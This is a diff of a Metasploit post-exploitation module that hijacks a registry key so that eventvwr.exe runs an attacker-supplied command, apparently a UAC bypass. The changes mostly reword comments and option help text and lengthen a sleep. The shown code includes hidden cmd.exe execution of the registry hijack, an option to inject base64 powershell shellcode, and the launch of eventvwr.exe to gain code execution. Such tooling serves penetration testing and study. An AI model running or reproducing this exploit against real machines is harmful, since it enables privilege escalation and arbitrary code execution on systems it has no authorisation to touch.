@@ -33,14 +33,14 @@
 #
 #
 # [ MODULE OPTIONS ]
-# The session number to run this module on      => set SESSION 3
-# The cmd.exe command to be executed (target)   => set EXEC_COMMAND start firefox.exe www.househot.com
-# Check target vulnerability settings/status?   => set CHECK_VULN true
-# Delete malicious registry hive keys/values?   => set DEL_REGKEY true
-# Exec powershell payload insted of a cmd comm? => set USE_POWERSHELL true
+# The session number to run this module on     => set SESSION 3
+# The cmd.exe command to be executed (target)  => set EXEC_COMMAND start firefox.exe www.househot.com
+# Check target vulnerability settings/status?  => set CHECK_VULN true
+# Delete malicious registry hive keys/values?  => set DEL_REGKEY true
+# Exec powershell shellcode insted of a cmd?   => set USE_POWERSHELL true
 # ---
-# HINT: To deploy a powershell payload we need to set USE_POWERSHELL true
-# and input the powershell base64 encoded shellcode into EXEC_COMMAND
+# HINT: To deploy a powershell payload (shellcode string) we need to set the option
+# 'USE_POWERSHELL true' and input the powershell base64 encoded shellcode into 'EXEC_COMMAND'
 # EXAMPLE: set USE_POWERSHELL true | set EXEC_COMMAND aDfSjRnGlsWlDtBsQkGftmoEdD==
 # ---
 #
@@ -141,7 +141,7 @@ class MetasploitModule < Msf::Post
 
                 register_advanced_options(
                         [
-                                OptBool.new('USE_POWERSHELL', [ false, 'Execute an powershell payload insted of a cmd command?' , false]),
+                                OptBool.new('USE_POWERSHELL', [ false, 'Execute powershell shellcode insted of a cmd command?' , false]),
                                 OptBool.new('DEL_REGKEY', [ false, 'Delete malicious registry key hive?' , false])
                         ], self.class) 
 
@@ -190,8 +190,8 @@ def ls_stage1
     end
 
     #
-    # chose to execute a single command in cmd.exe syntax
-    # or to execute a encoded (base64) payload powershell deploy 
+    # chose to execute a single command in cmd.exe syntax logic
+    # or to execute a shellcode(base64) string using powershell.exe
     #
     if datastore['USE_POWERSHELL'] == true
       comm_inje = "#{regi_hive} /ve /t REG_SZ /d \"#{psh_comma} #{exec_comm}\" /f"
@@ -205,7 +205,7 @@ def ls_stage1
  print_good(" Hijacking proccess to gain code execution...")
  r = session.sys.process.execute("cmd.exe /c #{comm_inje}", nil, {'Hidden' => true, 'Channelized' => true})
  # give a proper time to refresh regedit
- Rex::sleep(4.0)
+ Rex::sleep(4.5)
 
       # start remote service to gain code execution
       print_good(" Starting eventvwr.exe native proccess...")
